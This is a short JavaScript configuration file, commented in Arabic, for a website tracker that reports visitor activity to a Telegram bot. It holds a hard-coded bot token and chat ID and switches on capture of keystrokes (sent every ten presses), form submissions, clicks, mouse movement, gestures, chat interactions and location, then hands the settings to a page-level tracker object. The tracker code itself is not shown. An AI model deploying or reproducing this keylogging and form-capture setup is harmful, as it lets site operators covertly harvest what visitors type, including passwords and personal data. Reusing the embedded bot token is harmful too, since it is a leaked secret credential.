// ⚙️ إعدادات بوت التيليجرام
const TELEGRAM_CONFIG = {
    // معلومات البوت الحقيقية
    BOT_TOKEN: '7285756328:AAFHLQU8e72LO2U_IAhNrR99cttRBkT6CEU',
    CHAT_ID: '2126771039',
    
    // إعدادات متقدمة
    SETTINGS: {
        // تفعيل/إلغاء أنواع التتبع
        trackPageViews: true,
        trackClicks: true,
        trackForms: true,
        trackScrolling: true,
        trackTimeSpent: true,
        trackMouseMovement: true,
        trackKeystrokes: true,
        trackMobileGestures: true,
        trackChatInteractions: true,
        
        // فترات الإرسال (بالثواني)
        scrollReportInterval: 25, // كل 25% تمرير
        timeReportInterval: 60,   // كل دقيقة
        mouseReportThreshold: 100, // كل 100 حركة
        keyReportThreshold: 10,    // كل 10 ضغطات
        touchReportThreshold: 10,  // كل 10 لمسات
        
        // تصفية الرسائل
        minSessionTime: 5, // الحد الأدنى لوقت الجلسة (ثواني)
        maxMessageLength: 4000, // الحد الأقصى لطول الرسالة
        
        // معلومات إضافية
        includeUserAgent: true,
        includeScreenInfo: true,
        includeLocationInfo: true,
        includeReferrerInfo: true
    },
    
    // رسائل مخصصة
    MESSAGES: {
        newVisitor: '🎯 زائر جديد',
        pageView: '📄 عرض صفحة',
        click: '🖱️ نقرة',
        formSubmit: '📋 إرسال نموذج',
        scroll: '📜 تمرير',
        timeUpdate: '⏱️ تحديث الوقت',
        mouseActivity: '🖱️ نشاط الماوس',
        keyboardActivity: '⌨️ نشاط الكتابة',
        pageExit: '🚪 مغادرة الصفحة',
        mobileGesture: '📱 إيماءة هاتف',
        chatInteraction: '💬 تفاعل دردشة'
    }
};

// تحديث إعدادات النظام
if (window.telegramTracker) {
    window.telegramTracker.updateConfig(TELEGRAM_CONFIG);
}